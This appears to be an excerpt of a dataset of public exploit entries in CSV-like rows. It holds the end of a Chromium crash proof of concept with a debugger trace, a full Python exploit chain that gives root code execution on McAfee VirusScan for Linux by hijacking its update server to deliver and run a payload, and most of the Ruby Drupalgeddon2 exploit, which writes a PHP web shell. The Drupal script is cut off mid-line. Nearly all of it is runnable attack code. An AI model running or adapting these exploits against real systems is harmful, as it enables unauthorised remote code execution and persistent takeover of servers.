<RangeFromBufferIndex()+385>: jne 0x559e50c11418 <RangeFromBufferIndex()+1032> 0x559e50c11197 <RangeFromBufferIndex()+391>: add rdi,0xffffffffffffffff 0x559e50c1119b <RangeFromBufferIndex()+395>: mov rcx,rdi [------------------------------------stack-------------------------------------] 0000| 0x7f2cbf9aa9c0 --> 0xfe597d7178d --> 0x0 0008| 0x7f2cbf9aa9c8 --> 0xc0c001162e6 --> 0x0 0016| 0x7f2cbf9aa9d0 --> 0xfe597d717be --> 0x0 0024| 0x7f2cbf9aa9d8 --> 0xfe597d717bd --> 0x0 0032| 0x7f2cbf9aa9e0 --> 0x7f2cbeb8bdf4 --> 0x0 0040| 0x7f2cbf9aa9e8 --> 0x7f2cbeb8bea0 --> 0x6060008b1720 --> 0x602000098630 --> 0x200000003 --> 0x0  0048| 0x7f2cbf9aa9f0 --> 0x21bec4d308 --> 0x0 0056| 0x7f2cbf9aa9f8 --> 0xfe597cfab48 --> 0x0 [------------------------------------------------------------------------------] Legend: code, data, rodata, value Stopped reason: SIGSEGV 0x0000559e50c11189 in MappingForIndex () at ../../third_party/blink/renderer/core/editing/finder/find_buffer.cc:450 450 ../../third_party/blink/renderer/core/editing/finder/find_buffer.cc: No such file or directory.   <!DOCTYPE html> <head> <script type=""text/javascript""> document.addEventListener(""DOMContentLoaded"", function(){ find(decodeURIComponent('\uFFFC')); }); </script> </head> <body> <legend></legend> </body> </html>",['80.0.3987.87'],1
40911,"McAfee Virus Scan Enterprise for Linux 1.9.2 < 2.0.2 - Remote Code Execution ''' Source: https://nation.state.actor/mcafee.html  Vulnerabilities  CVE-2016-8016: Remote Unauthenticated File Existence Test CVE-2016-8017: Remote Unauthenticated File Read (with Constraints) CVE-2016-8018: No Cross-Site Request Forgery Tokens CVE-2016-8019: Cross Site Scripting CVE-2016-8020: Authenticated Remote Code Execution & Privilege Escalation CVE-2016-8021: Web Interface Allows Arbitrary File Write to Known Location CVE-2016-8022: Remote Use of Authentication Tokens CVE-2016-8023: Brute Force Authentication Tokens CVE-2016-8024: HTTP Response Splitting CVE-2016-8025: Authenticated SQL Injection When chaned together, these vulnerabilities allow a remote attacker to execute code as root. ''' #!/bin/python3 import time import requests import os import sys import re import threading import subprocess from http.server import BaseHTTPRequestHandler, HTTPServer from socketserver import ThreadingMixIn  # Per-target configuration target_domain=""https://10.0.1.130"" # https://target_ip local_ip = '10.0.1.128'                 # Attacker IP for victim to connect back to authorized_ip=""127.0.0.1""           # IP address cookie will be valid for update_server_port = 8080               # Port update server listens on delay_seconds = 10                      # How long should the server take to serve the update target_port = 55443                 # Port to target  # Put payload script in payload.sh  # Initialization payload_in_place = threading.Event() requests.packages.urllib3.disable_warnings() with open(""payload.sh"", ""r"") as f:     payload = f.read()  def pprint(inp, flag=False):     pad = ""#""     if flag:         pad = ""*""     print(""\n"" + pad+ "" "" + inp)   def crack_cookie():     pprint(""Cracking Cookie"")      # A page that requires authentication     url = target_domain + "":"" + str(target_port) + ""/0409/nails?pg=proxy&tplt=productUpdate.html""      # Start at the current time + 100 in case of recent login with clock skew     date_val = int(time.time()+100)     cookie_fmt = authorized_ip+""/n/0/%d-checksum// ""+authorized_ip + "" ""*20      # Make requests, print after every 600     while True:         cookie = cookie_fmt % date_val         req_cookie = {""nailsSessionId"": cookie}         r = requests.get(url, cookies=req_cookie, verify=False)         r.raise_for_status()          if ""Set-Cookie"" in r.headers:             valid_cookie = cookie             timestamp = cookie.split(""/"")[3].split(""-"")[0]             break          elif date_val % 600 == 0:             print(""Now trying  %s"" % time.asctime(time.localtime(date_val)))          date_val -= 1      pprint(""Cookie Cracked: "" + timestamp, True)     return valid_cookie   def update_update_server(auth_cookie):     pprint(""Updating update server"")      # Replace McAfeeHttp update server with attacker local_ip:update_server_port     url = target_domain + "":"" + str(target_port) + ""/0409/nails?pg=proxy&addr=127.0.0.1%3A65443&tplt="" \     ""repository.html&sitelist=add&mon%3A0=db+set+1+_table%3Drepository+status%3D1+siteList%3D%253C%253F"" \     ""xml%2520version%253D%25221.0%2522%2520encoding%253D%2522UTF-8%2522%253F%253E%250A%253Cns%253ASiteLists"" \     ""%2520xmlns%253Ans%253D%2522naSiteList%2522%2520GlobalVersion%253D%2522PATTeELCQSEhZwxKf4PoXNSY4%2Fg%25"" \     ""3D%2522%2520LocalVersion%253D%2522Wed%252C%252030%2520Dec%25202009%252011%253A20%253A59%2520UTC%2522%2"" \     ""520Type%253D%2522Client%2522%253E%253CPolicies%2F%253E%253CSiteList%2520Default%253D%25221%2522%2520Na"" \     ""me%253D%2522SomeGUID%2522%253E%253CHttpSite%2520Type%253D%2522repository%2522%2520Name%253D%2522McAfee"" \     ""Http%2522%2520Order%253D%25221%2522%2520Server%253D%2522""+local_ip+""%253A""+str(update_server_port) \     + ""%2522%2520Enabled%253D%25221%2522%2520Local%253D%25221%2522%253E%253CRelativePath%2F%253E%253CUseAuth%"" \     ""253E0%253C%2FUseAuth%253E%253CUserName%253E%253C%2FUserName%253E%253CPassword%2520Encrypted%253D%25220"" \     ""%2522%2F%253E%253C%2FHttpSite%253E%253CFTPSite%2520Type%253D%2522fallback%2522%2520Name%253D%2522McAfe"" \     ""eFtp%2522%2520Order%253D%25222%2522%2520Server%253D%2522ftp.nai.com%253A21%2522%2520Enabled%253D%25221"" \     ""%2522%2520Local%253D%25221%2522%253E%253CRelativePath%253ECommonUpdater%253C%2FRelativePath%253E%253CU"" \     ""seAuth%253E1%253C%2FUseAuth%253E%253CUserName%253Eanonymous%253C%2FUserName%253E%253CPassword%2520Encr"" \     ""ypted%253D%25221%2522%253ECommonUpdater%40McAfeeB2B.com%253C%2FPassword%253E%253C%2FFTPSite%253E%253C%"" \     ""2FSiteList%253E%253C%2Fns%253ASiteLists%253E+_cmd%3Dupdate+&mon%3A1=task+setsitelist&mon%3A2=db+select"" \     ""+_show%3DsiteList+_show%3Dstatus+_table%3Drepository&info%3A2=multi%2Cshow&reposProperty=repository&re"" \     ""posProperty=fallback&useOfProxy=on""      r = requests.get(url, cookies=auth_cookie, verify=False)     r.raise_for_status()     pprint(""Updated update server"", True)  def download_update(req_cookie):     pprint(""Requesting target download payload"")      # Send request to make target download payload     url = target_domain + "":"" + str(target_port) + ""/0409/nails""      updateName = ""update_%d"" % int(time.time())     postdata = (""pg=proxy&addr=127.0.0.1%3A65443&tplt=scheduledTasks.html&scheduleOp=add&mon%3A0=db+set+1+_tab"" \     ""le%3Dschedule++taskName%3D{0}+taskType%3DUpdate+taskInfo%3DtoUpdate%3Ddat%253Bengine+timetable%3Dtype%"" \     ""3Dunscheduled+status%3DIdle++i_recurrenceCounter%3D0+&mon%3A1=task+nstart+{0}&mon%3A2=db+select+_asc%3D"" \     ""taskName+_table%3Dschedule+_show%3Di_taskId+_show%3DtaskName+_show%3DtaskResults+_show%3Dtimetable+_sh"" \     ""ow%3DtaskType+_show%3DtaskInfo+_show%3Di_lastRun+_show%3D%24i_lastRun+_show%3Dstatus+_show%3Dprogress+"" \     ""_show%3Di_nextRun+_show%3D%24i_nextRun+_show%3Di_duration+_show%3DtaskInfo++_limit%3D50+_offset%3D0&in"" \     ""fo%3A2=multi%2Cshow&mon%3A3=db+select+_table%3Dschedule+_show%3Dcount%28*%29&info%3A3=multi%2Cshow&loc"" \     ""%3A4=conf+get+browser.resultsPerPage&info%3A4=multi%2Cshow&mon%3A5=task+updatecrontab&info%3A5=multi%2"" \     ""Cshow&echo%3A6=1&info%3A6=pageNo&echo%3A7=&info%3A7=selectedTask"""""").format(updateName)      headers = {'Content-Type': 'application/x-www-form-urlencoded'}     r = requests.post(url, data=postdata, cookies=req_cookie, verify=False, headers=headers)     r.raise_for_status()      pprint(""Payload download requested"", 1)   def exec_catalogz(req_cookie):     pprint(""Making target execute payload"")      #### Get commit_id and ODS_name     url = target_domain + "":"" + str(target_port) + ""/0409/nails?pg=proxy&tplt=schedOnDemand.html&addr=127.0"" \     "".0.1:65443&mon:0=sconf+ODS+select+section%3Dnailsd.profile.ODS&info:0=multi,show,digest&echo:1=ODS&inf"" \     ""o:1=profileName&mon:2=sconf+ODS+select+section%3Dnailsd.profile.ODS_default&info:2=multi,show&echo:3=O"" \     ""DS_default&info:3=defaultProfileName&mon:4=sconf+ODS+select+attribute%3Dnailsd.oasEnabled&info:4=multi"" \     "",show&mon:5=extensions&info:5=multi,show&mon:6=db+select+_show=max(i_taskId)+_table=schedule&info:6=mu"" \     ""lti,show&mon:7=utco&info:7=single,show,serverUtcOffset&echo:8=generate&info:8=profileNameAction""      r = requests.get(url, cookies=req_cookie, verify=False)     r.raise_for_status()      regex = re.search(""\|digest=(.+?)\|"", r.text)     if not regex:         print(""\nERROR: Could not get commit_id when generating evil scan\n"")         return False      commit_id = regex.groups(1)[0]      # Send request to start evil scan     payload_path = ""%2Fopt%2FMcAfee%2Fcma%2Fscratch%2Fupdate%2Fcatalog.z""     binary_path = ""%2Fbin%2Fsh"" # Use ""%2fbin%2Fstatic-sh"" for versions 1.x      url = target_domain + "":"" + str(target_port) + ""/0409/nails""      ODS_name = ""ODS_1""   # This may need to be increased if the name already exists     scan_name = ""scan_%s"" % str(int(time.time()))      postdata =  (""pg=proxy&addr=127.0.0.1%3A65443&tplt=scheduledTasks.html&mon%3A0=sconf+{1}+begin&info%3A0="" \     ""multi%2Cshow&mon%3A1=sconf+{1}+delete+{0}+section%3Dnailsd.profile.{1}.filter+section%3Dnailsd.prof"" \     ""ile.{1}.action&mon%3A2=sconf+{1}+set+{0}+nailsd.profile.{1}.allFiles%3Dtrue+nailsd.profile.{1}.child"" \     ""InitTmo%3D240+nailsd.profile.{1}.cleanChildren%3D2+nailsd.profile.{1}.cleansPerChild%3D10000+nailsd"" \     "".profile.{1}.datPath%3D%2Fopt%2FNAI%2FLinuxShield%2Fengine%2Fdat+nailsd.profile.{1}.decompArchive%3"" \     ""Dtrue+nailsd.profile.{1}.decompExe%3Dtrue+nailsd.profile.{1}.engineLibDir%3D%2Fopt%2FNAI%2FLinuxShi"" \     ""eld%2Fengine%2Flib+nailsd.profile.{1}.enginePath%3D{3}+nailsd.profile.{1}.factoryI"" \     ""nitTmo%3D240+nailsd.profile.{1}.heuristicAnalysis%3Dtrue+nailsd.profile.{1}.macroAnalysis%3Dtrue+na"" \     ""ilsd.profile.{1}.maxQueSize%3D32+nailsd.profile.{1}.mime%3Dtrue+nailsd.profile.{1}.noJokes%3Dfalse+"" \     ""nailsd.profile.{1}.program%3Dtrue+nailsd.profile.{1}.quarantineChildren%3D1+nailsd.profile.{1}.quar"" \     ""antineDirectory%3D%2Fquarantine+nailsd.profile.{1}.quarantineFromRemoteFS%3Dfalse+nailsd.profile.{1"" \     ""}.quarantinesPerChild%3D10000+nailsd.profile.{1}.scanChildren%3D2+nailsd.profile.{1}.scanMaxTmo%3D3"" \     ""00+nailsd.profile.{1}.scanNWFiles%3Dfalse+nailsd.profile.{1}.scanOnRead%3Dtrue+nailsd.profile.{1}.s"" \     ""canOnWrite%3Dtrue+nailsd.profile.{1}.scannerPath%3D{4}+nailsd.profile.{1}.scansPerChild"" \     ""%3D10000+nailsd.profile.{1}.slowScanChildren%3D0+nailsd.profile.{1}.filter.0.type%3Dexclude-path+na"" \     ""ilsd.profile.{1}.filter.0.path%3D%2Fproc+nailsd.profile.{1}.filter.0.subdir%3Dtrue+nailsd.profile.{"" \     ""1}.filter.1.type%3Dexclude-path+nailsd.profile.{1}.filter.1.path%3D%2Fquarantine+nailsd.profile.{1}"" \     "".filter.1.subdir%3Dtrue+nailsd.profile.{1}.filter.extensions.mode%3Dall+nailsd.profile.{1}.filter.e"" \     ""xtensions.type%3Dextension+nailsd.profile.{1}.action.Default.primary%3DClean+nailsd.profile.{1}.act"" \     ""ion.Default.secondary%3DQuarantine+nailsd.profile.{1}.action.App.primary%3DClean+nailsd.profile.{1}"" \     "".action.App.secondary%3DQuarantine+nailsd.profile.{1}.action.timeout%3DPass+nailsd.profile.{1}.acti"" \     ""on.error%3DBlock&mon%3A3=sconf+{1}+commit+{0}&mon%3A4=db+set+{0}+_table%3Dschedule++taskName%3D{2}+"" \     ""taskType%3DOn-Demand+taskInfo%3DprofileName%3D{1}%2Cpaths%3Dpath%3A%2Ftmp%3Bexclude%3Atrue+timetabl"" \     ""e%3Dtype%3Dunscheduled+progress%3D+status%3DIdle+&mon%3A5=task+nstart+{2}&mon%3A6=db+select+_asc%3D"" \     ""taskName+_table%3Dschedule+_show%3Di_taskId+_show%3DtaskName+_show%3DtaskResults+_show%3Dtimetable+"" \     ""_show%3DtaskType+_show%3DtaskInfo+_show%3Di_lastRun+_show%3D%24i_lastRun+_show%3Dstatus+_show%3Dpro"" \     ""gress+_show%3Di_nextRun+_show%3D%24i_nextRun+_show%3Di_duration+_show%3DtaskInfo++_limit%3D50+_offs"" \     ""et%3D0&info%3A6=multi%2Cshow&mon%3A7=db+select+_table%3Dschedule+_show%3Dcount%28*%29&info%3A7=mult"" \     ""i%2Cshow&mon%3A8=sconf+ODS+begin&info%3A8=multi%2Cshow%2Cdigest&mon%3A9=task+updatecrontab&info%3A9"" \     ""=multi%2Cshow&loc%3A10=conf+get+browser.resultsPerPage&info%3A10=multi%2Cshow&echo%3A11=1&info%3A11"" \     ""=pageNo&echo%3A12=&info%3A12=selectedTask"").format(commit_id, ODS_name, scan_name,payload_path, binary_path)      headers = {'Content-Type': 'application/x-www-form-urlencoded'}     r = requests.post(url, data=postdata, cookies=req_cookie, verify=False, headers=headers)     r.raise_for_status()      pprint(""Payload executed"", 1)  def start_update_server():      class RequestHandler(BaseHTTPRequestHandler):         def do_HEAD(s):             s.send_response(200)             s.send_header(""Content-type"", ""text/html"")             s.end_headers()          def do_GET(s):             if s.path == ""/catalog.z"":                 s.send_response(200)                 s.send_header(""Content-type"", ""text/html"")                 s.end_headers()                 s.wfile.write(bytes(payload, ""utf-8""))                  pprint(""Payload placed"", 1)                  payload_in_place.set()                  # Die after sending payload so we send an incomplete response                 raise KillServer              else: # Assume all other requests are for SiteStat - Always increasing version                 s.send_response(200)                 s.send_header(""Content-type"", ""text/xml"")                 s.end_headers()                 s.wfile.write(bytes((""""""<?xml version=""1.0"" encoding=""UTF-8""?>"""""" \                 """"""<SiteStatus Status=""Enabled"" CatalogVersion=""2%d"">"""""" \                 """""" </SiteStatus>"""""") % int(time.time()), ""utf-8""))      # Throwing KillServer will shutdown the server ungracefully     class KillServer(Exception):         def __str__(self):             return ""Kill Server (not an error)""      # ThreadingMixIn plus support for KillServer exceptions     class AbortableThreadingMixIn(ThreadingMixIn):         def process_request_thread(self, request, client_address):             try:                 self.finish_request(request, client_address)                 self.shutdown_request(request)             except KillServer:                 pprint(""Killing update server dirtily"")                 self.shutdown_request(request)                 self.shutdown() # Only if we want to shutdown             except:                 self.handle_error(request, client_address)                 self.shutdown_request(request)       class BackgroundHTTPSrv(AbortableThreadingMixIn, HTTPServer):         pass      pprint(""Launching update server"")      srv = BackgroundHTTPSrv((local_ip, update_server_port), RequestHandler)     threading.Thread(target=srv.serve_forever).start()      pprint(""Update server started"", 1)     return srv   #################################################################################### ####################################################################################  pprint(""Attacking %s"" % target_domain, 1)  # Crack the auth cookie cookie = crack_cookie() auth_cookie = {""nailsSessionId"": cookie}  # Start our update server locally srv = start_update_server()  # Force target to use our update server update_update_server(auth_cookie)  # Make target download an update from us download_update(auth_cookie)  # Block until the target downloads our payload, payload_in_place.wait()  # Shutdown our update server srv.shutdown()  # Execute /bin/sh -(?) catalog.z exec_catalogz(auth_cookie)",['1.9.2 < 2.0.2'],1
44449,"Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution #!/usr/bin/env ruby # # [CVE-2018-7600] Drupal <= 8.5.0 / <= 8.4.5 / <= 8.3.8 / 7.23 <= 7.57 - 'Drupalgeddon2' (SA-CORE-2018-002) ~ https://github.com/dreadlocked/Drupalgeddon2/ # # Authors: # - Hans Topo ~ https://github.com/dreadlocked // https://twitter.com/_dreadlocked # - g0tmi1k   ~ https://blog.g0tmi1k.com/ // https://twitter.com/g0tmi1k #   require 'base64' require 'json' require 'net/http' require 'openssl' require 'readline' require 'highline/import'   # Settings - Try to write a PHP to the web root? try_phpshell = true # Settings - General/Stealth $useragent = ""drupalgeddon2"" webshell = ""shell.php"" # Settings - Proxy information (nil to disable) $proxy_addr = nil $proxy_port = 8080   # Settings - Payload (we could just be happy without this PHP shell, by using just the OS shell - but this is 'better'!) bashcmd = ""<?php if( isset( $_REQUEST['c'] ) ) { system( $_REQUEST['c'] . ' 2>&1' ); }"" bashcmd = ""echo "" + Base64.strict_encode64(bashcmd) + "" | base64 -d""   # - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -   # Function http_request <url> [type] [data] def http_request(url, type=""get"", payload="""", cookie="""")   puts verbose(""HTTP - URL : #{url}"") if $verbose   puts verbose(""HTTP - Type: #{type}"") if $verbose   puts verbose(""HTTP - Data: #{payload}"") if not payload.empty? and $verbose    begin     uri = URI(url)     request = type =~ /get/? Net::HTTP::Get.new(uri.request_uri) : Net::HTTP::Post.new(uri.request_uri)     request.initialize_http_header({""User-Agent"" => $useragent})     request.initialize_http_header(""Cookie"" => cookie) if not cookie.empty?     request.body = payload if not payload.empty?     return $http.request(request)   rescue SocketError     puts error(""Network connectivity issue"")   rescue Errno::ECONNREFUSED => e     puts error(""The target is down ~ #{e.message}"")     puts error(""Maybe try disabling the proxy (#{$proxy_addr}:#{$proxy_port})..."") if $proxy_addr   rescue Timeout::Error => e     puts error(""The target timed out ~ #{e.message}"")   end    # If we got here, something went wrong.   exit end   # Function gen_evil_url <cmd> [method] [shell] [phpfunction] def gen_evil_url(evil, element="""", shell=false, phpfunction=""passthru"")   puts info(""Payload: #{evil}"") if not shell   puts verbose(""Element    : #{element}"") if not shell and not element.empty? and $verbose   puts verbose(""PHP fn     : #{phpfunction}"") if not shell and $verbose    # Vulnerable parameters: #access_callback / #lazy_builder / #pre_render / #post_render   # Check the version to match the payload   if $drupalverion.start_with?(""8"") and element == ""mail""     # Method #1 - Drupal v8.x: mail, #post_render - HTTP 200     url = $target + $clean_url + $form + ""?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax""     payload = ""form_id=user_register_form&_drupal_ajax=1&mail[a][#post_render][]="" + phpfunction + ""&mail[a][#type]=markup&mail[a][#markup]="" + evil    elsif $drupalverion.start_with?(""8"") and element == ""timezone""     # Method #2 - Drupal v8.x: timezone, #lazy_builder - HTTP 500 if phpfunction=exec // HTTP 200 if phpfunction=passthru     url = $target + $clean_url + $form + ""?element_parents=timezone/timezone/%23value&ajax_form=1&_wrapper_format=drupal_ajax""     payload = ""form_id=user_register_form&_drupal_ajax=1&timezone[a][#lazy_builder][]="" + phpfunction + ""&timezone[a][#lazy_builder][][]="" + evil      #puts warning(""WARNING: May benefit to use a PHP web shell"") if not try_phpshell and phpfunction != ""passthru""    elsif $drupalverion.start_with?(""7"") and element == ""name""     # Method #3 - Drupal v7.x: name, #post_render - HTTP 200     url = $target + ""#{$clean_url}#{$form}&name[%23post_render][]="" + phpfunction + ""&name[%23type]=markup&name[%23markup]="" + evil     payload = ""form_id=user_pass&_triggering_element_name=name""   end    # Drupal v7.x needs an extra value from a form   if $drupalverion.start_with?(""7"")     response = http_request(url, ""post"", payload, $session_cookie)      form_name = ""form_build_id""     puts verbose(""Form name  : #{form_name}"") if $verbose      form_value = response.body.match(/input type=""hidden"" name=""#{form_name}"" value=""(.*)""/).to_s.slice(/value=""(.*)""/, 1).to_s.strip     puts warning(""WARNING: Didn't detect #{form_name}"") if form_value.empty?     puts verbose(""Form value : #{form_value}"") if $verbose      url = $target + ""#{$clean_url}file/ajax/name/%23value/"" + form_value     payload = ""#{form_name}=#{form_value}""   end    return url, payload end   # Function clean_result <input> def clean_result(input)   #result = JSON.pretty_generate(JSON[response.body])   #result = $drupalverion.start_with?(""8"")? JSON.parse(clean)[0][""data""] : clean   clean = input.to_s.strip    # PHP function: passthru   # For: <payload>[{""command"":""insert"",""method"":""replaceWith"",""selector"":null,""data"":""\u003Cspan class=\u0022ajax-new-content\u0022\u003E\u003C\/span\u003E"",""settings"":null}]   clean.slice!(/\[{""command"":"".*}\]$/)    # PHP function: exec   # For: [{""command"":""insert"",""method"":""replaceWith"",""selector"":null,""data"":""<payload>\u003Cspan class=\u0022ajax-new-content\u0022\u003E\u003C\/span\u003E"",""settings"":null}]   #clean.slice!(/\[{""command"":"".*data"":""/)   #clean.slice!(/\\u003Cspan class=\\u0022.*}\]$/)    # Newer PHP for an older Drupal   # For: <b>Deprecated</b>:  assert(): Calling assert() with a string argument is deprecated in <b>/var/www/html/core/lib/Drupal/Core/Plugin/DefaultPluginManager.php</b> on line <b>151</b><br />   #clean.slice!(/<b>.*<br \/>/)    # Drupal v8.x Method #2 ~ timezone, #lazy_builder, passthru, HTTP 500   # For: <b>Deprecated</b>:  assert(): Calling assert() with a string argument is deprecated in <b>/var/www/html/core/lib/Drupal/Core/Plugin/DefaultPluginManager.php</b> on line <b>151</b><br />   clean.slice!(/The website encountered an unexpected error.*/)    return clean end   # Feedback when something goes right def success(text)   # Green   return ""\e[#{32}m[+]\e[0m #{text}"" end  # Feedback when something goes wrong def error(text)   # Red   return ""\e[#{31}m[-]\e[0m #{text}"" end  # Feedback when something may have issues def warning(text)   # Yellow   return ""\e[#{33}m[!]\e[0m #{text}"" end  # Feedback when something doing something def action(text)   # Blue   return ""\e[#{34}m[*]\e[0m #{text}"" end  # Feedback with helpful information def info(text)   # Light blue   return ""\e[#{94}m[i]\e[0m #{text}"" end  # Feedback for the overkill def verbose(text)   # Dark grey   return ""\e[#{90}m[v]\e[0m #{text}"" end   # - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -  def init_authentication()   $uname = ask('Enter your username:  ') { |q| q.echo = false }   $passwd = ask('Enter your password:  ') { |q| q.echo = false }   $uname_field = ask('Enter the name of the username form field:  ') { |q| q.echo = true }   $passwd_field = ask('Enter the name of the password form field:  ') { |q| q.echo = true }   $login_path = ask('Enter your login path (e.g., user/login):  ') { |q| q.echo = true }   $creds_suffix = ask('Enter the suffix eventually required after the credentials in the login HTTP POST request (e.g., &form_id=...):  ') { |q| q.echo = true } end  def is_arg(args, param)   args.each do |arg|     if arg == param       return true     end   end   return false end   # Quick how to use def usage()   puts 'Usage: ruby drupalggedon2.rb <target> [--authentication] [--verbose]'   puts 'Example for target that does not require authentication:'   puts '       ruby drupalgeddon2.rb https://example.com'   puts 'Example for target that does require authentication:'   puts '       ruby drupalgeddon2.rb https://example.com --authentication' end   # Read in values if ARGV.empty?   usage()   exit end  $target = ARGV[0] init_authentication() if is_arg(ARGV, '--authentication') $verbose = is_arg(ARGV, '--verbose')   # Check input for protocol $target = ""http://#{$target}"" if not $target.start_with?(""http"") # Check input for the end $target += ""/"" if not $target.end_with?(""/"")   # - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -   # Banner puts action(""--==[::#Drupalggedon2::]==--"") puts ""-""*80 puts info(""Target : #{$target}"") puts info(""Proxy  : #{$proxy_addr}:#{$proxy_port}"") if $proxy_addr puts info(""Write? : Skipping writing PHP web shell"") if not try_phpshell puts ""-""*80   # - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -   # Setup connection uri = URI($target) $http = Net::HTTP.new(uri.host, uri.port, $proxy_addr, $proxy_port)  # Use SSL/TLS if needed if uri.scheme == ""https""   $http.use_ssl = true   $http.verify_mode = OpenSSL::SSL::VERIFY_NONE end  $session_cookie = '' # If authentication required then login and get session cookie if $uname   $payload = $uname_field + '=' + $uname + '&' + $passwd_field + '=' + $passwd + $creds_suffix   response = http_request($target + $login_path, 'post', $payload, $session_cookie)   if (response.code == '200' or response.code == '303') and not response.body.empty? and response['set-cookie']     $session_cookie = response['set-cookie'].split('; ')[0]     puts success(""Logged in - Session Cookie : #{$session_cookie}"")   end  end  # - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -   # Try and get version $drupalverion = """"  # Possible URLs url = [   # --- changelog ---   # Drupal v6.x / v7.x [200]   $target + ""CHANGELOG.txt"",   # Drupal v8.x [200]   $target + ""core/CHANGELOG.txt"",    # --- bootstrap ---   # Drupal v7.x / v6.x [403]   $target + ""includes/bootstrap.inc"",   # Drupal v8.x [403]   $target + ""core/includes/bootstrap.inc"",    # --- database ---   # Drupal v7.x / v6.x  [403]   $target + ""includes/database.inc"",   # Drupal v7.x [403]   #$target + ""includes/database/database.inc"",   # Drupal v8.x [403]   #$target + ""core/includes/database.inc"",    # --- landing page ---   # Drupal v8.x / v7.x [200]   $target, ]  # Check all url.each do|uri|   # Check response   response = http_request(uri, 'get', '', $session_cookie)    # Check header   if response['X-Generator'] and $drupalverion.empty?     header = response['X-Generator'].slice(/Drupal (.*) \(https:\/\/www.drupal.org\)/, 1).to_s.strip      if not header.empty?       $drupalverion = ""#{header}.x"" if $drupalverion.empty?       puts success(""Header : v#{header} [X-Generator]"")       puts verbose(""X-Generator: #{response['X-Generator']}"") if $verbose     end   end    # Check request response, valid   if response.code == ""200""     tmp = $verbose ?  ""    [HTTP Size: #{response.size}]""  : """"     puts success(""Found  : #{uri}    (HTTP Response: #{response.code})#{tmp}"")      # Check to see if it says: The requested URL ""http://<URL>"" was not found on this server.     puts warning(""WARNING: Could be a false-positive [1-1], as the file could be reported to be missing"") if response.body.downcase.include? ""was not found on this server""      # Check to see if it says: <h1 class=""js-quickedit-page-title title page-title"">Page not found</h1> <div class=""content"">The requested page could not be found.</div>     puts warning(""WARNING: Could be a false-positive [1-2], as the file could be reported to be missing"") if response.body.downcase.include? ""the requested page could not be found""      # Only works for CHANGELOG.txt     if uri.match(/CHANGELOG.txt/)       # Check if valid. Source ~ https://api.drupal.org/api/drupal/core%21CHANGELOG.txt/8.5.x // https://api.drupal.org/api/drupal/CHANGELOG.txt/7.x       puts warning(""WARNING: Unable to detect keyword 'drupal.org'"") if not response.body.downcase.include? ""drupal.org""        # Patched already? (For Drupal v8.4.x / v7.x)       puts warning(""WARNING: Might be patched! Found SA-CORE-2018-002: #{url}"") if response.body.include? ""SA-CORE-2018-002""        # Try and get version from the file contents (For Drupal v8.4.x / v7.x)       $drupalverion = response.body.match(/Drupal (.*),/).to_s.slice(/Drupal (.*),/, 1).to_s.strip        # Blank if not valid       $drupalverion = """" if not $drupalverion[-1] =~ /\d/     end      # Check meta tag     if not response.body.empty?       # For Drupal v8.x / v7.x       meta = response.body.match(/<meta name=""Generator"" content=""Drupal (.*) /)       metatag = meta.to_s.slice(/meta name=""Generator"" content=""Drupal (.*) \(http/, 1).to_s.strip        if not metatag.empty?         $drupalverion = ""#{metatag}.x"" if $drupalverion.empty?         puts success(""Metatag: v#{$drupalverion} [Generator]"")         puts verbose(meta.to_s) if $verbose       end     end      # Done! ...if a full known version, else keep going... may get lucky later!     break if not $drupalverion.end_with?(""x"") and not $drupalverion.empty?   end    # Check request response, not allowed   if response.code == ""403"" and $drupalverion.empty?     tmp = $verbose ?  ""    [HTTP Size: #{response.size}]""  : """"     puts success(""Found  : #{uri}    (HTTP Response: #{response.code})#{tmp}"")      if $drupalverion.empty?       # Try and get version from the URL (For Drupal v.7.x/v6.x)       $drupalverion = uri.match(/includes\/database.inc/)? ""7.x/6.x"" : """" if $drupalverion.empty?       # Try and get version from the URL (For Drupal v8.x)       $drupalverion = uri.match(/core/)? ""8.x"" : """" if $drupalverion.empty?        # If we got something, show it!       puts success(""URL    : v#{$drupalverion}?"") if not $drupalverion.empty?     end    else     tmp = $verbose ?  ""    [HTTP Size: #{response.size}]""  : """"     puts warning(""MISSING: #{uri}    (HTTP Response: #{response.code})#{tmp}"")   end end   # Feedback if not $drupalverion.empty?   status = $drupalverion.end_with?(""x"")? ""?"" : ""!""   puts success(""Drupal#{status}: v#{$drupalverion}"") else   puts error(""Didn't detect Drupal version"")   exit end  if not $drupalverion.start_with?(""8"") and not $drupalverion.start_with?(""7"")   puts error(""Unsupported Drupal version (#{$drupalverion})"")   exit end puts ""-""*80     # - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -    # The attack vector to use $form = $drupalverion.start_with?(""8"")? ""user/register"" : ""user/password""  # Make a request, check for form url = ""#{$target}?q=#{$form}"" puts action(""Testing: Form   (#{$form})"") response = http_request(url, 'get', '', $session_cookie) if response.code == ""200"" and not response.body.empty?   puts success(""Result : Form valid"") elsif response['location']   puts error(""Target is NOT exploitable [5] (HTTP Response: #{response.code})...   Could try following the redirect: #{response['location']}"")   exit elsif response.code == ""404""   puts error(""Target is NOT exploitable [4] (HTTP Response: #{response.code})...   Form disabled?"")   exit elsif response.code == ""403""   puts error(""Target is NOT exploitable [3] (HTTP Response: #{response.code})...   Form blocked?"")   exit elsif response.body.empty?   puts error(""Target is NOT exploitable [2] (HTTP Response: #{response.code})...   Got an empty response"")   exit else   puts warning(""WARNING: Target may NOT exploitable [1] (HTTP Response: #{response.code})"") end   puts ""- ""*40   # Make a request, check for clean URLs status ~ Enabled: /user/register   Disabled: /?q=user/register # Drupal v7.x needs it anyway $clean_url = $drupalverion.start_with?(""8"")? """" : ""?q="" url = ""#{$target}#{$form}""  puts action(""Testing: Clean URLs"") response = http_request(url, 'get', '', $session_cookie) if response.code == ""200"" and not response.body.empty?   puts success(""Result : Clean URLs enabled"") else   $clean_url = ""?q=""   puts warning(""Result : Clean URLs disabled (HTTP Response: #{response.code})"")   puts verbose(""response.body: #{response.body}"") if $verbose    # Drupal v8.x needs it to be enabled   if $drupalverion.start_with?(""8"")     puts error(""Sorry dave... Required for Drupal v8.x... So... NOPE NOPE NOPE"")     exit   elsif 